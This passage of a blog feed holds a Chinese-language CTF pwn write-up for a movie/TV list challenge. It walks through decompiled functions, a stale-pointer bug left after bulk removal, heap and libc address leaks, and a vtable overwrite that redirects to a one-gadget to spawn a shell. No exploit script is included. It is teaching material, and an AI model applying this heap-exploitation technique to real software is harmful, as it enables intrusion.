class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">float</span> v1; <span class="comment">// xmm1_4</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+0h] [rbp-88h]</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">216u</span>LL);</span><br><span class="line">  <span class="built_in">memset</span>((<span class="keyword">void</span> *)v0, <span class="number">0</span>, <span class="number">0xD8</span>uLL);</span><br><span class="line">  *(_QWORD *)v0 = printf_movie;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Movie name? "</span>);</span><br><span class="line">  get_input((__int64)&amp;v3, <span class="number">0x3F</span>uLL, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>((<span class="keyword">char</span> *)(v0 + <span class="number">8</span>), <span class="number">0x40</span>uLL, <span class="string">"%s"</span>, &amp;v3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Actors? "</span>);</span><br><span class="line">  *(_QWORD *)(v0 + <span class="number">208</span>) = sub_400CC0(); <span class="comment">//这里会额外申请一块内存放数据</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Rating? "</span>);</span><br><span class="line">  get_input((__int64)&amp;v3, <span class="number">0xF</span>uLL, <span class="number">10</span>);</span><br><span class="line">  v1 = strtod((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v3, <span class="number">0L</span>L);</span><br><span class="line">  *(<span class="keyword">float</span> *)(v0 + <span class="number">200</span>) = v1;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Movie introduction? "</span>, <span class="number">0L</span>L);</span><br><span class="line">  get_input((__int64)&amp;v3, <span class="number">0x7F</span>uLL, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>((<span class="keyword">char</span> *)(v0 + <span class="number">72</span>), <span class="number">0x80</span>uLL, <span class="string">"%s"</span>, &amp;v3);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)put_in_list(v0, <span class="number">128L</span>L) )</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"New movie added."</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v0 + <span class="number">16L</span>L))(v0);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="remove"><a href="#remove" class="headerlink" title="remove"></a>remove</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">remove</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v1; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v2; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+0h] [rbp-58h]</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="number">0L</span>L;</span><br><span class="line">  v1 = <span class="number">-1L</span>L;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"TV/Movie name to remove? "</span>);</span><br><span class="line">  get_input((__int64)&amp;v4, <span class="number">0x3F</span>uLL, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = (<span class="keyword">const</span> <span class="keyword">char</span> *)list_table[v0];</span><br><span class="line">    <span class="keyword">if</span> ( v2 &amp;&amp; !<span class="built_in">strcmp</span>(v2 + <span class="number">8</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v4) )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">      (*(<span class="keyword">void</span> (__fastcall **)(<span class="keyword">const</span> <span class="keyword">char</span> *, __int64 *))(*(_QWORD *)v2 + <span class="number">16L</span>L))(v2, &amp;v4);</span><br><span class="line">    &#125;</span><br><span class="line">    ++v0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v0 != <span class="number">32</span> );</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)v1 == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Not found."</span>);</span><br><span class="line">  list_table[v1] = <span class="number">0L</span>L;   <span class="comment">//这里只清0了最后一个</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Removed successfully"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞点是：remove那里可以批量删除name一样的，但是只清空了最后一个指针。</p><h3 id="show"><a href="#show" class="headerlink" title="show"></a>show</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> (**v1)(<span class="keyword">const</span> <span class="keyword">char</span> *, ...); <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">1</span>;</span><br><span class="line">  v1 = (<span class="keyword">int</span> (**)(<span class="keyword">const</span> <span class="keyword">char</span> *, ...))list_table;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      (**(<span class="keyword">void</span> (***)(<span class="keyword">void</span>))*v1)();</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v1 != &amp;<span class="built_in">printf</span> );</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)result )</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"No Movie/TV exists!"</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h2><p>先创建3个名字一样的tv，然后都删掉，再创建一个movie，其中movie的actor会在堆中申请一片内存写入，我们可以通过actor，伪造一个movie，可以控制actor的指针，然后show的时候就可以任意地址读了。下面是movie打印信息的函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">sub_4011B0</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(</span><br><span class="line">           <span class="string">"Movie &lt;%s&gt;: %s rating: %.2f actors: %s\n"</span>,</span><br><span class="line">           a1 + <span class="number">8</span>,</span><br><span class="line">           a1 + <span class="number">72</span>,</span><br><span class="line">           *(_QWORD *)(a1 + <span class="number">208</span>),  <span class="comment">//这里可以用来任意地址读</span></span><br><span class="line">           *(<span class="keyword">float</span> *)(a1 + <span class="number">200</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>通过这个方法可以泄露出malloc地址，以及list_table地址。（可以计算magic gadget）</p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>伪造movie的虚表vtable，使其指向我们可控的内存（泄露了heap地址，将magic gadget地址写入heap中就行了）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.rodata:00000000004015A0 ; `vtable for&apos;Movie</span><br><span class="line">.rodata:00000000004015A0 _ZTV5Movie      dq 0                    ; offset to this</span><br><span class="line">.rodata:00000000004015A8                 dq offset _ZTI5Movie    ; `typeinfo for&apos;Movie</span><br><span class="line">.rodata:00000000004015B0 printf_movie    dq offset sub_4011B0    ; DATA XREF: add_movie+24↑o  //改成magic地址</span><br><span class="line">.rodata:00000000004015B8                 dq offset nullsub_2</span><br><span class="line">.rodata:00000000004015C0                 dq offset j___ZdlPv     ; operator delete(void *)</span><br><span class="line">.rodata:00000000004015C8                 align 20h</span><br><span class="line">.rodata:00000000004015E0 ; `vtable for&apos;TV</span><br><span class="line">.rodata:00000000004015E0 _ZTV2TV         dq 0                    ; offset to this</span><br><span class="line">.rodata:00000000004015E8                 dq offset _ZTI2TV       ; `typeinfo for&apos;TV</span><br><span class="line">.rodata:00000000004015F0 printf_tv       dq offset sub_4011E0    ; DATA XREF: add_tv+24↑o</span><br><span class="line">.rodata:00000000004015F8                 dq offset nullsub_1</span><br><span class="line">.rodata:0000000000401600                 dq offset j___ZdlPv_0   ; operator delete(void *)</span><br></pre></td></tr></table></figure></p><p>show的时候，list_table的开头存放这vtable的地址，vtable的开头是打印函数，如果伪造vtable的指向magic，就可以直接getshell了。</p><p>本题没有提供libc，需要通过泄露地址的后3位来查找。<br><a href="https://libc.blukat.me/" target="_blank" rel="noopener">https://libc.blukat.me/</a></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>暂时不放</p><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>菜鸟乱写一通，看不懂不要喷，欢迎纠正。完成，撒花~~~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;blog已经搭了一段时间了，拖延症发作，一直没写。最近没做什么有意思的题，就写一下某CTF群的入群题解题思路。&lt;/p&gt;
&lt;h2 id=&quot;程序伪代码&quot;&gt;&lt;a href=&quot;#程序伪代码&quot; class=&quot;headerlink&quot; title=&quot;程序伪代码&quot;&gt;&lt;/a&gt;程序伪代码&lt;/h
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
</feed>
